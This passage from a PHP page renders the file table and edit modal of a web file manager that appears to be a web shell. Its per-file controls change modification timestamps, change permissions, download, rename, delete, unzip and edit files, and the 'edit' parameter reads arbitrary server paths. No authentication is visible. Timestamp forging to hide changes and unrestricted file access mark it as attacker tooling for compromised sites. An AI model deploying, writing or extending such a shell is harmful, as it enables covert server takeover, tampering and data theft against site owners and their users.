        $icon = $isDir
            ? "📁"
            : (preg_match('/\.(php|html|js|css)$/i', $f) ? "🖥️" : "📄");

        echo $icon . " ";
        ?>

        <?php if ($isDir): ?>
            <a href="?path=<?php echo urlencode($full); ?>"><strong><?php echo htmlspecialchars($f); ?></strong></a>
        <?php else: ?>
            <?php if ($isEditable): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($full); ?>">
                    <strong><?php echo htmlspecialchars($f); ?></strong>
                </a>
            <?php else: ?>
                <span class="lock-icon">🔒</span>
                <span class="not-editable"><strong><?php echo htmlspecialchars($f); ?></strong></span>
            <?php endif; ?>
        <?php endif; ?>
        </td>

        <td><?php echo $size; ?></td>
        <td><?php echo date("Y-m-d H:i:s", @filemtime($full)); ?></td>

        <td>
        <a href="#" onclick="dateBox('<?php echo htmlspecialchars($f, ENT_QUOTES); ?>');return false;" style="color:#00ff6a;">Mod Date</a>
        <div id="dt_<?php echo htmlspecialchars($f, ENT_QUOTES); ?>" style="display:none;margin-top:5px">
            <form method="post">
                <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($f); ?>">
                <input name="new_date_str" value="<?php echo date("Y-m-d H:i:s", @filemtime($full)); ?>" style="width:130px;font-size:0.8rem;padding:2px;background:#0a0a0a;color:#00ff6a;border:1px solid #ff0040;border-radius:4px;">
                <button type="submit" name="changedate_btn" style="padding:2px 8px;font-size:0.75rem;background:#00d4ff;color:#000;">OK</button>
            </form>
        </div>
        </td>

        <td>
        <a href="#" onclick="chmodBox('<?php echo htmlspecialchars($f, ENT_QUOTES); ?>');return false;" style="color:#a855f7;" title="Change Permissions"><?php echo $perms; ?></a>
        <div id="ch_<?php echo htmlspecialchars($f, ENT_QUOTES); ?>" style="display:none;margin-top:5px">
            <form method="post">
                <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($f); ?>">
                <input name="new_perms" value="<?php echo $perms; ?>" style="width:60px;font-size:0.8rem;padding:2px;background:#0a0a0a;color:#00ff6a;border:1px solid #ff0040;border-radius:4px;" placeholder="0755">
                <button type="submit" name="chmod_btn" style="padding:2px 8px;font-size:0.75rem;background:#00d4ff;color:#000;">OK</button>
            </form>
        </div>
        </td>

        <td>
        <?php
        echo $isDir
        ? '-'
        : '<a href="?path=' . urlencode($path) . '&download=' . urlencode($f) . '">Download</a>';
        ?>
        </td>

        <td>
        <a href="#" onclick="renameBox('<?php echo htmlspecialchars($f, ENT_QUOTES); ?>');return false;">Rename</a>
        <div id="rn_<?php echo htmlspecialchars($f, ENT_QUOTES); ?>" style="display:none;margin-top:5px">
            <form method="post">
                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
                <input name="newname" value="<?php echo htmlspecialchars($f); ?>" style="background:#0a0a0a;color:#e0e0e0;border:1px solid #333;border-radius:4px;padding:2px 6px;">
                <button type="submit" name="renamefile" style="padding:2px 8px;font-size:0.75rem;background:#00d4ff;color:#000;">OK</button>
            </form>
        </div>
        </td>

        <td>
        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Delete?')">Delete</a>
        </td>

        <td>
        <?php
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        echo (!$isDir && $ext == 'zip')
        ? '<a href="?path=' . urlencode($path) . '&extract=' . urlencode($f) . '" onclick="return confirm(\'Extract here?\')">Extract</a>'
        : '-';
        ?>
        </td>

        </tr>
        <?php endforeach; ?>
    </table>
    </div>
</form>

<?php if (isset($_GET['edit'])):
$ef = $_GET['edit'];
$content = htmlspecialchars(@file_get_contents($ef));
?>
<div id="editModal" class="modal-overlay"><div class="modal-box">

<h3 style="color:#00d4ff;">Editing: <?php echo htmlspecialchars($ef); ?></h3>

<?php if ($saveStatus === "success"): ?>
<div class="alert-success">✔ File saved</div>
<?php elseif ($saveStatus === "error"): ?>
<div class="alert-error">✖ Save failed</div>
<?php endif; ?>

<form method="post">
<input type="hidden" name="filepath" value="<?php echo htmlspecialchars($ef); ?>">
<textarea name="content"><?php echo $content; ?></textarea>

<div class="modal-actions">
<button type="submit" name="savefile" style="background:#00d4ff;color:#000;">Save</button>
<button type="button" onclick="closeEdit()" style="background:#ff0040;">Close</button>
</div>

</form>

</div></div>
<?php endif; ?>

</body></html>
